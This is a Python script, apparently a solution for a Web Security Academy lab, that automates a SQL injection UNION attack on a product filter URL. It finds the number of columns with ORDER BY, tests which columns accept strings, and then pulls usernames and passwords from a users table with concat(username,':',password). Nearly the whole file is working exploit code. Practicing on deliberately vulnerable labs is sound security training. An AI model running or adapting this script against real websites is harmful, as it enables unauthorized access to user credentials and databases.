#Extracting multiSQL injection UNION attack, retrieving data from other tables
#Extract data from tables of that database
#Soution: First finding the number of column and then finding the number 

import requests
url = "https://0abd000504544107c04cdf5e0016002a.web-security-academy.net/filter?category=Pets"

def retrieve_column(url):
    for i in range(1,100):
        query="'Order+by+"+str(i)+"+--"
        r = requests.get(url+query)
        if r.status_code !=200:
            break
    return (i-1)
tables = retrieve_column(url)
print("Total number of columns:-->",tables)

def passing_null_values(url):
    null_value = ("")
    for i in range(tables):
        null_value = "NULL,"+null_value
    null_value = null_value[0:-1]
    query="'union+select+"+null_value+"+--"
    r = requests.get(url+query)
    #print(r.status_code)
    #print(r.text)
    return null_value
null_value_passing=passing_null_values(url)
null_value_passing_list = list(null_value_passing.split(','))
#print(null_value_passing)
#print(null_value_passing_list)

def replacing_strings(stringName,source,destination,j):
    stringName[j] = destination
    return stringName

def list_to_string(stringName):
    return(" ,".join([str(elem) for elem in stringName]))


def passing_strings(url,null_value_passing_list):
    #Passing any string
    src = "NULL"
    for i in range(0,len(null_value_passing_list)):
        output_value = replacing_strings(null_value_passing_list,src,"'a'", i)
        output_string = list_to_string(output_value)
        query = "'UNION SELECT "+output_string+" -- "
        #print(url+query)
        r = requests.get(url+query)
        #print(r)
        #print(r.text)
        null_value_passing_list[i] = src
        if r.status_code == 200:
            print("\nValid for:{}".format(url+query))
        else:
            print("\nInvalid for:{}".format(url+query))

passing_strings(url, null_value_passing_list)




# for existing users table
def retrieving_user(url,null_value_passing_list):

  #Passing any string
    src = "NULL"
    for i in range(0,len(null_value_passing_list)):
        output_value = replacing_strings(null_value_passing_list,src,"concat(username,':',password)", i)
        output_string = list_to_string(output_value)
        query = "'UNION SELECT "+output_string+" from users -- "
        #print(url+query)
        r = requests.get(url+query)
        #print(r)
        #print(r.text)
        null_value_passing_list[i] = src
        if r.status_code == 200:
            print("\nValid for:{}".format(url+query))
            print("\n",r.text)
        else:
            print("\nInvalid for:{}".format(url+query))

retrieving_user(url, null_value_passing_list)